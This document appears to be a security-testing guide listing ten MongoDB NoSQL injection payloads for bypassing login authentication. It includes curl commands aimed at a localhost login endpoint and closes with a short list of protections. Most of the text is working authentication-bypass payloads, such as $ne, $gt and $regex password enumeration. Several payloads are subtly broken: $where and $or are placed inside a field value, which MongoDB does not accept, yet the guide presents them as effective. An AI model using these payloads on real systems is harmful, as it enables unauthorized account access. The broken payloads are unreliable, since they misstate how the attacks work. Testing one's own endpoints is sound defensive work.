# 10 Most Advanced NoSQL Injection Attack Payloads

## 1. Boolean-Based Blind Injection (Always True)
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```
**Purpose**: Bypasses authentication by making query always return true

## 2. JavaScript Injection via $where
```json
{
  "username": "admin",
  "password": {"$where": "this.password == 'anything' || '1'=='1'"}
}
```
**Purpose**: Executes arbitrary JavaScript in MongoDB context

## 3. Regex Injection for Password Enumeration
```json
{
  "username": "admin",
  "password": {"$regex": "^a"}
}
```
**Purpose**: Brute-force password character by character

## 4. Array Injection to Bypass Validation
```json
{
  "username": ["admin", {"$ne": ""}],
  "password": ["password", {"$gt": ""}]
}
```
**Purpose**: Exploits improper array handling

## 5. Operator Injection with $gt (Greater Than)
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
**Purpose**: Matches any password value (always true)

## 6. Time-Based Blind Injection
```json
{
  "username": "admin",
  "password": {
    "$where": "sleep(5000) || this.password == 'test'"
  }
}
```
**Purpose**: Causes delay to confirm vulnerability

## 7. NoSQL Injection via $in Operator
```json
{
  "username": {"$in": ["admin", "root", "administrator"]},
  "password": {"$ne": ""}
}
```
**Purpose**: Tests multiple usernames simultaneously

## 8. Nested Object Injection
```json
{
  "username": "admin",
  "password": {
    "$or": [
      {"$eq": "wrong"},
      {"$ne": ""}
    ]
  }
}
```
**Purpose**: Complex logical bypass using nested operators

## 9. Type Confusion Attack
```json
{
  "username": "admin",
  "password": {
    "$type": 2
  }
}
```
**Purpose**: Matches based on BSON type (2 = string)

## 10. Advanced $expr Injection (MongoDB 3.6+)
```json
{
  "username": "admin",
  "$expr": {
    "$gt": [
      {"$strLenCP": "$password"},
      0
    ]
  }
}
```
**Purpose**: Uses aggregation expressions in queries to bypass filters

---

## Testing Script

Use these payloads in your login endpoint:

```bash
# Test 1: Boolean bypass
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Test 2: Regex enumeration
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# Test 3: Greater than bypass
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# Test 4: $in operator
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$in":["admin","root"]},"password":{"$ne":""}}'

# Test 5: $where injection
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$where":"1==1"}}'
```

## Expected Results

**Vulnerable System**: Returns successful login or user data
**Protected System**: Returns validation error or sanitized query

## Protection Mechanisms

Your system should implement:
1. ✅ Input validation (reject objects, only accept strings)
2. ✅ Sanitization (strip MongoDB operators like $ne, $gt, $where)
3. ✅ Type checking (ensure username/password are strings)
4. ✅ Parameterized queries (use proper query builders)
5. ✅ Rate limiting (prevent brute force)

## How to Test Your Protection

Run the test script:
```bash
node backend/test-nosql-injection.js
```

Or use the HTML test page:
```bash
# Open in browser
backend/test-injection.html
```
